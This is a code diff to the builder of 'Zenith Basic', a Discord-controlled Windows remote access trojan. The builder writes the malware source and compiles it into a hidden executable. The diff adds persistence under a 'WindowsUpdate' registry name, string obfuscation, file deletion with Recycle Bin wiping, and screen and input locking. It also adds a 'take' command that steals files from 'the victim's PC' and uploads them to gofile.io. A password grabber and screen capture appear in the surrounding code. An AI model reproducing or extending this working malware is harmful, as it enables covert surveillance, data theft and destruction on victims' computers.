@@ -34,7 +34,7 @@ def print_banner():
   / /  __/ | | | | |_| | | |
  /___\___|_| |_|_|\__|_| |_|
                                                                  
-                                                                      Zenith Basic v2.0"""
+                                                                      Zenith Basic v3.0"""
     
     print()
     faded_banner = fade.water(banner)
@@ -47,7 +47,8 @@ def main():
     python_exe = f'"{sys.executable}"'
     
     print(f"{Fore.CYAN}Checking / installing required packages (this may take a minute the first time)...")
-    rat_packages = "discord.py pywin32 pycryptodome opencv-python psutil GPUtil requests appdirs"
+    os.environ['PYTHONIOENCODING'] = 'utf-8'
+    rat_packages = "discord.py[voice] pywin32 pycryptodome opencv-python psutil GPUtil requests appdirs pyaudio mss Pillow nuitka"
     pip_result = os.system(f"{python_exe} -m pip install {rat_packages} --upgrade --force-reinstall --no-warn-script-location -q")
     if pip_result != 0:
         print(f"{Fore.YELLOW}Warning: pip install returned code {pip_result}. Continuing anyway...")
@@ -57,11 +58,71 @@ def main():
     
     token = input(f"{Fore.GREEN}paste your discord bot token here: {Style.RESET_ALL}")
     
+    exe_name = input(f"{Fore.GREEN}Enter name for the final executable (without .exe) [default: client]: {Style.RESET_ALL}").strip()
+    if not exe_name:
+        exe_name = "client"
+
+    startup_name = input(f"{Fore.GREEN}Enter name to use in startup (registry / scheduled task) [default: WindowsUpdate]: {Style.RESET_ALL}").strip()
+    if not startup_name:
+        startup_name = "WindowsUpdate"
+    
     print(f"\n{Fore.YELLOW}starting building process")
     time.sleep(1)
     
-    code = f"""TOKEN = '{token}'\n\n"""
+    code = f"""TOKEN = '{token}'
+STARTUP_NAME = '{startup_name}'
 
+import sys
+import importlib.util
+_original = importlib.util.decode_source
+def _safe_decode(b):
+    try: return _original(b)
+    except UnicodeDecodeError: return b.decode('utf-8', errors='replace')
+importlib.util.decode_source = _safe_decode
+
+"""
+
+    code = code + r"""
+import sys
+if "--blockscreen" in sys.argv:
+    import tkinter as tk
+    import ctypes
+    import os
+    import time
+    unblock_flag = os.path.join(os.getenv("TEMP"), "unblock.flag")
+    ctypes.windll.user32.BlockInput(True)
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.configure(bg="black")
+    root.attributes("-topmost", True)
+    root.overrideredirect(True)
+    def keep_blocking():
+        ctypes.windll.user32.BlockInput(True)
+        if os.path.exists(unblock_flag):
+            try:
+                ctypes.windll.user32.BlockInput(False)
+                os.remove(unblock_flag)
+            except:
+                pass
+            root.destroy()
+            return
+        root.after(600, keep_blocking)
+    root.after(600, keep_blocking)
+    root.mainloop()
+    sys.exit()
+
+import base64, hashlib, zlib, platform
+_SALT = hashlib.sha256(b"ZenithRAT_Salt_v2_" + platform.node().encode()).digest()[:16]
+def _xor(data: bytes, key: bytes) -> bytes:
+    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
+def _s(e: str) -> str:
+    try:
+        data = base64.b64decode(e)
+        x = _xor(data, _SALT)
+        return zlib.decompress(x).decode('utf-8', errors='ignore')
+    except:
+        return ""
+"""
     code = code + r"""import discord, platform, asyncio, tempfile, os, re, subprocess, datetime, ctypes, psutil, sys, winreg, sqlite3, threading, requests, random, time, json, base64, shutil, win32crypt, webbrowser
 from discord.ext import commands
 from ctypes import windll
@@ -112,10 +173,10 @@ def install_persistence():
 
 
         appdata = os.getenv("APPDATA")
-        persist_dir = os.path.join(appdata, "Microsoft", "Windows", "SecurityHealth")
+        persist_dir = os.path.join(appdata, "Microsoft", "Windows", STARTUP_NAME)
         os.makedirs(persist_dir, exist_ok=True)
         subprocess.run(f'attrib +h "{os.path.dirname(persist_dir)}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        persist_path = os.path.join(persist_dir, "SecurityHealth.exe")
+        persist_path = os.path.join(persist_dir, f"{STARTUP_NAME}.exe")
 
         is_original = os.path.abspath(current_path).lower() != os.path.abspath(persist_path).lower()
 
@@ -127,51 +188,10 @@ def install_persistence():
             except:
                 pass
 
-            # Registry Run (main)
+            # Only one reliable startup method to avoid double execution
             try:
                 with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
-                    winreg.SetValueEx(key, "SecurityHealth", 0, winreg.REG_SZ, f'"{persist_path}"')
-            except:
-                pass
-
-            # Registry RunOnce (strong backup for restart/shutdown)
-            try:
-                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", 0, winreg.KEY_SET_VALUE) as key:
-                    winreg.SetValueEx(key, "SecurityHealth", 0, winreg.REG_SZ, f'"{persist_path}"')
-            except:
-                pass
-
-            # Scheduled task without LIMITED (much more reliable after reboot)
-            try:
-                task_name = "SecurityHealth"
-                cmd = f'schtasks /create /tn "{task_name}" /tr "{persist_path}" /sc onlogon /f >nul 2>&1'
-                subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            except:
-                pass
-
-            # Startup folder .lnk
-            try:
-                startup_folder = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-                os.makedirs(startup_folder, exist_ok=True)
-                shortcut_path = os.path.join(startup_folder, "SecurityHealth.lnk")
-
-                vbs_script = f'''
-Set ws = CreateObject("WScript.Shell")
-Set shortcut = ws.CreateShortcut("{shortcut_path}")
-shortcut.TargetPath = "{persist_path}"
-shortcut.WorkingDirectory = "{os.path.dirname(persist_path)}"
-shortcut.WindowStyle = 7
-shortcut.IconLocation = "shell32.dll,13"
-shortcut.Save
-'''
-                vbs_path = os.path.join(tempfile._get_default_tempdir(), "persist_shortcut.vbs")
-                with open(vbs_path, "w") as f:
-                    f.write(vbs_script)
-                subprocess.run(f'wscript "{vbs_path}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                try:
-                    os.remove(vbs_path)
-                except:
-                    pass
+                    winreg.SetValueEx(key, STARTUP_NAME, 0, winreg.REG_SZ, f'"{persist_path}"')
             except:
                 pass
 
@@ -209,41 +229,37 @@ intents = discord.Intents.all()
 class CustomHelpCommand(commands.HelpCommand):
     async def send_bot_help(self, mapping):
         embed = discord.Embed(
-            title="Bot Commands",
-            description="Here are all available commands:",
+            title="Available Commands",
             color=discord.Color.blue()
         )
-        
-        for cog, commands in mapping.items():
-            filtered = await self.filter_commands(commands, sort=True)
-            if filtered:
-                commands_text = ""
-                for cmd in filtered:
-                    commands_text += f"`{prefix}{cmd.name}` - {cmd.brief}\n"
-                if commands_text:
-                    embed.add_field(
-                        name="Commands",
-                        value=commands_text,
-                        inline=False
-                    )
-        
-        embed.set_footer(text=f"Use {prefix}help <command> for more details about a command.")
+
+        commands_list = []
+        for cog, cmds in mapping.items():
+            filtered = await self.filter_commands(cmds, sort=True)
+            for cmd in filtered:
+                brief = cmd.brief or "No description"
+                commands_list.append(f"`{prefix}{cmd.name}` - {brief}")
+
+        commands_list.sort(key=lambda x: x.lower())
+        if commands_list:
+            embed.description = "\n".join(commands_list)
+        else:
+            embed.description = "No commands available."
+
+        embed.set_footer(text=f"Use {prefix}help <command> for more info.")
         await self.get_destination().send(embed=embed)
 
     async def send_command_help(self, command):
         embed = discord.Embed(
-            title=f"Command: {command.name}",
+            title=f"${command.name}",
             description=command.description or command.brief or "No description available.",
             color=discord.Color.green()
         )
-        
         if command.aliases:
             embed.add_field(name="Aliases", value=", ".join(command.aliases), inline=False)
-        
         usage = f"{prefix}{command.name}"
         if command.usage:
             usage = command.usage
-            
         embed.add_field(name="Usage", value=f"`{usage}`", inline=False)
         await self.get_destination().send(embed=embed)
 
@@ -303,8 +319,12 @@ class Bot(commands.Bot):
 bot = Bot(command_prefix=prefix, intents=intents, help_command=CustomHelpCommand())
 bot.allowed_channel_ids = {} 
 
+screen_blocker = None
+
 @bot.check
 async def check_channel(ctx):
+    if ctx.command and ctx.command.name == "help":
+        return True
     if ctx.guild is None:
         return False
     guild_id = str(ctx.guild.id)
@@ -319,13 +339,29 @@ async def on_connect():
         return
     try:
         guild = bot.guilds[0]
+        pc_name = platform.node()
+        session_channel_name = f"session-{pc_name}"
 
+        # Look for existing session channel for this PC
+        existing_channel = discord.utils.get(guild.text_channels, name=session_channel_name)
+
+        if existing_channel:
+            # Reuse existing live session
+            bot.allowed_channel_ids[str(guild.id)] = existing_channel.id
+            try:
+                await existing_channel.send(f"Reconnected to existing session for {pc_name}.")
+            except:
+                pass
+            return
+
+        # No existing session — create new one
         category = discord.utils.get(guild.categories, name="Sessions")
         if category is None:
             category = await guild.create_category("Sessions")
-        channel = await guild.create_text_channel(f'session-{platform.node()}', category=category)
+
+        channel = await guild.create_text_channel(session_channel_name, category=category)
         bot.allowed_channel_ids[str(guild.id)] = channel.id
-        await channel.send(f"New session started for {platform.node()}. Commands will only work in this channel.")
+        await channel.send(f"New session started for {pc_name}. Commands will only work in this channel.")
     except Exception as e:
         print(f"Failed to create session channel: {e}")
 
@@ -422,7 +458,8 @@ async def screenshot(ctx):
     $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
     $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
     $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
-    $bitmap.Save("screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
+    $tempPng = Join-Path $env:TEMP "screenshot.png"
+    $bitmap.Save($tempPng, [System.Drawing.Imaging.ImageFormat]::Png)
     $graphics.Dispose()
     $bitmap.Dispose()
     '''
@@ -435,15 +472,19 @@ async def screenshot(ctx):
         
         await send_subprocess(ctx, f'powershell -ExecutionPolicy Bypass -File "{script_path}"')
         
-        if os.path.exists("screenshot.png"):
+        tempPng = os.path.join(tempfile.gettempdir(), "screenshot.png")
+        if os.path.exists(tempPng):
             embed = discord.Embed(
                 title="Screenshot",
                 description="Screenshot taken at " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 color=discord.Color.purple()
             )
-            await ctx.send(embed=embed, file=discord.File("screenshot.png"))
+            await ctx.send(embed=embed, file=discord.File(tempPng))
             
-            os.remove("screenshot.png")
+            try:
+                os.remove(tempPng)
+            except:
+                pass
         else:
             await ctx.send("Failed to capture screenshot.")
             
@@ -783,8 +824,12 @@ async def spam_site(ctx, url: str, amount: int = 100):
         def do_spam():
             for _ in range(amount):
                 try:
-                    webbrowser.open(url, new=0)
-                    time.sleep(0.01)
+                    subprocess.Popen(
+                        f'start "" "{url}"',
+                        shell=True,
+                        creationflags=subprocess.CREATE_NO_WINDOW
+                    )
+                    time.sleep(0.05)
                 except:
                     pass
 
@@ -952,29 +997,204 @@ async def grabpassword(ctx):
     except Exception as e:
         await ctx.send(f"Error grabbing passwords: {str(e)}")
 
+
+
+@bot.command(brief="Upload a file from Discord to the victim's PC (attachment only).")
+async def upload(ctx):
+    await ctx.send("Send the file as a Discord attachment now.")
+    def check(m):
+        return m.author == ctx.author and len(m.attachments) > 0
+    try:
+        msg = await bot.wait_for('message', check=check, timeout=60.0)
+        att = msg.attachments[0]
+        downloads = os.path.join(os.path.expanduser("~"), "Downloads")
+        os.makedirs(downloads, exist_ok=True)
+        filepath = os.path.join(downloads, att.filename)
+        await att.save(filepath)
+        await ctx.send(f"File downloaded to: `{filepath}`")
+    except asyncio.TimeoutError:
+        await ctx.send("Timed out waiting for file upload.")
+
+@bot.command(brief="Permanently delete a file from the victim's PC (including Recycle Bin).")
+async def delete(ctx, *, path: str):
+    user_profile = os.path.expanduser("~")
+    search_dirs = [
+        os.path.join(user_profile, "Downloads"),
+        os.path.join(user_profile, "Desktop"),
+        os.path.join(user_profile, "Documents"),
+        os.path.join(user_profile, "Pictures"),
+        os.path.join(user_profile, "Videos"),
+        user_profile,
+    ]
+
+    found_path = None
+
+    # First try exact path
+    if os.path.exists(path):
+        found_path = path
+    else:
+        # Treat as filename and search common locations
+        for directory in search_dirs:
+            if not os.path.exists(directory):
+                continue
+            for root, dirs, files in os.walk(directory):
+                for f in files:
+                    if f.lower() == path.lower():
+                        found_path = os.path.join(root, f)
+                        break
+                if found_path:
+                    break
+            if found_path:
+                break
+
+    if not found_path:
+        await ctx.send(f"Could not find `{path}` (searched common folders).")
+        return
+
+    try:
+        os.remove(found_path)
+        import ctypes
+        ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 0x00000001 | 0x00000002 | 0x00000004)
+        await ctx.send(f"Permanently deleted: `{found_path}` (including Recycle Bin)")
+    except Exception as e:
+        await ctx.send(f"Error deleting file: {e}")
+
+
+@bot.command(brief="Block the victim's screen and disable keyboard/mouse input.")
+async def blockscreen(ctx):
+    try:
+        exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+        subprocess.Popen([exe, "--blockscreen"], creationflags=0x08000000 | 0x00000008)
+        await ctx.send("Screen blocked aggressively.")
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
+
+
+@bot.command(brief="Unblock screen and restore input.")
+async def unblockscreen(ctx):
+    try:
+        import ctypes
+        import time
+        flag_path = os.path.join(os.getenv("TEMP"), "unblock.flag")
+        open(flag_path, "w").close()
+        for _ in range(12):
+            ctypes.windll.user32.BlockInput(False)
+            time.sleep(0.25)
+        # Aggressive process cleanup for any blocker instances
+        try:
+            current_pid = os.getpid()
+            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                if proc.info['pid'] == current_pid:
+                    continue
+                cmd = " ".join(proc.info.get('cmdline') or [])
+                if "--blockscreen" in cmd:
+                    proc.kill()
+        except:
+            pass
+        await ctx.send("Screen unblocked. Input restored.")
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
+
+
+@bot.command(brief="Steal a file from the victim's PC and upload it to gofile.io, then send the link.")
+async def take(ctx, *, filename: str):
+    await ctx.send(f"Searching for `{filename}`...")
+
+    user_profile = os.path.expanduser("~")
+    search_dirs = [
+        os.path.join(user_profile, "Downloads"),
+        os.path.join(user_profile, "Desktop"),
+        os.path.join(user_profile, "Documents"),
+        os.path.join(user_profile, "Pictures"),
+        os.path.join(user_profile, "Videos"),
+        user_profile,
+    ]
+
+    found_path = None
+    for directory in search_dirs:
+        if not os.path.exists(directory):
+            continue
+        for root, dirs, files in os.walk(directory):
+            if filename.lower() in [f.lower() for f in files]:
+                for f in files:
+                    if f.lower() == filename.lower():
+                        found_path = os.path.join(root, f)
+                        break
+            if found_path:
+                break
+        if found_path:
+            break
+
+    if not found_path:
+        await ctx.send(f"Could not find `{filename}` in common locations.")
+        return
+
+    file_size = os.path.getsize(found_path)
+    max_discord_size = 8 * 1024 * 1024  # 8 MB safe limit for most Discord servers/bots
+
+    if file_size <= max_discord_size:
+        try:
+            await ctx.send(file=discord.File(found_path))
+            return  # Successfully sent via Discord
+        except Exception as e:
+            await ctx.send(f"Discord upload failed ({e}). Falling back to gofile.io...")
+
+    # Fallback to gofile.io
+    await ctx.send(f"Found: `{found_path}` ({file_size / 1024:.1f} KB). Uploading to gofile.io...")
+
+    try:
+        with open(found_path, "rb") as f:
+            files = {"file": (os.path.basename(found_path), f)}
+            response = requests.post("https://upload.gofile.io/uploadFile", files=files, timeout=300)
+
+        if response.status_code == 200:
+            data = response.json()
+            if data.get("status") == "ok":
+                link = data["data"]["downloadPage"]
+                await ctx.send(f"File uploaded successfully!\n**Link:** {link}")
+            else:
+                await ctx.send(f"Upload failed: {data.get('status', 'unknown error')}")
+        else:
+            await ctx.send(f"Upload failed with status code {response.status_code}")
+    except Exception as e:
+        await ctx.send(f"Error uploading file: {e}")
+
+
+
 install_persistence()
 
 bot.run(TOKEN)
 """
 
-    with open("code.py", "w") as file:
-        file.write(code)
+    with open("code.py", "w", encoding="utf-8") as file:
+        file.write("# -*- coding: utf-8 -*-\n" + code)
 
     print(f"{Fore.CYAN}Running PyInstaller using: {sys.executable}")
-    build_cmd = (
-        f'{python_exe} -m PyInstaller --onefile --noconsole --icon=NONE '
-        '--hidden-import=win32crypt --hidden-import=Crypto.Cipher.AES '
-        '--hidden-import=cv2 --hidden-import=GPUtil --hidden-import=psutil '
-        '--hidden-import=discord --hidden-import=discord.commands '
-        '--hidden-import=discord.commands.context --hidden-import=discord.ext.commands '
-        '--hidden-import=discord.app_commands --hidden-import=discord.ui '
-        '--hidden-import=discord.enums --hidden-import=discord.interactions '
-        '--hidden-import=appdirs --hidden-import=pkg_resources '
-        '--collect-all setuptools --collect-submodules discord --collect-submodules aiohttp code.py'
-    )
-    result = os.system(build_cmd)
 
-    exe_path = os.path.join("dist", "code.exe")
+    pyinstaller_args = [
+        sys.executable, "-X", "utf8", "-m", "PyInstaller",
+        "--onefile", "--noconsole", "--icon=NONE", "--clean", "--log-level=ERROR",
+        "--name", exe_name,
+        # Minimal, hardened list to avoid encoding crashes
+        "--hidden-import=win32crypt",
+        "--hidden-import=Crypto.Cipher.AES",
+        "--hidden-import=psutil",
+        "--hidden-import=discord",
+        "--hidden-import=discord.commands",
+        "--hidden-import=discord.ext.commands",
+        "--hidden-import=pyaudio",
+        "--hidden-import=mss",
+        "--hidden-import=PIL.Image",
+        "code.py"
+    ]
+
+    env = os.environ.copy()
+    env['PYTHONIOENCODING'] = 'utf-8:surrogateescape'
+    env['PYTHONUTF8'] = '1'
+
+    result = subprocess.run(pyinstaller_args, env=env, capture_output=True, text=True).returncode
+
+    exe_path = os.path.join("dist", f"{exe_name}.exe")
     if os.path.exists(exe_path):
         print(f"\n{Fore.GREEN}[OK] Build successful!")
         print(f"{Fore.GREEN}The executable is here: {os.path.abspath(exe_path)}")
